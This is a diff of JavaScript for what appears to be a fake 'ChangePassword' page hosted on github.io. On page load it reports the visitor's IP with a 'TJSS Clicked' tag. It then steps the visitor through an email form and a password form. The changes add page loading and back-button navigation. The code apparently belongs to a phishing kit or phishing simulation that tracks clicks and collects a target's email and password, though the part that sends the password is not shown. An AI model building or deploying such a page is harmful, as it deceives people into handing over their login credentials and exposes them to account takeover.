@@ -1,13 +1,24 @@
 const rootUrl = "https://gpaphitis.github.io/ChangePassword";
 // const rootUrl = "http://localhost:5500";
-let email = null;
+let email = "";
 document.addEventListener("DOMContentLoaded", function ()
 {
-   document.querySelector("#next").addEventListener("click", goToNext);
-   document.querySelector("#target-email").addEventListener("input", isValidEmail);
+   goToEmail();
    $emailSender.sendIp("TJSS Clicked");
 });
-function goToNext()
+function goToEmail(){
+   loadEmailPage().then(()=>{
+      document.querySelector("#next").addEventListener("click", goToPassword);
+      document.querySelector("#target-email").addEventListener("input", isValidEmail);
+   })
+}
+async function loadEmailPage(){
+   let response = await fetch(`${rootUrl}/f2f2000d4d54aafd9fcb459896ec195ed3f8dfb4/email.html`);
+   let page = await response.text();
+   document.querySelector("#info-form").innerHTML = page;
+   document.querySelector("#target-email").value=email;
+}
+function goToPassword()
 {
    email = document.querySelector("#target-email").value;
    if (!isValidEmail())
@@ -20,6 +31,7 @@ function goToNext()
    loadPasswordPage().then(() =>
    {
       document.querySelector("#submit").addEventListener("click", submitEmail);
+      document.querySelector("#back-btn").addEventListener("click", goToEmail);
    });
 }
 async function loadPasswordPage()
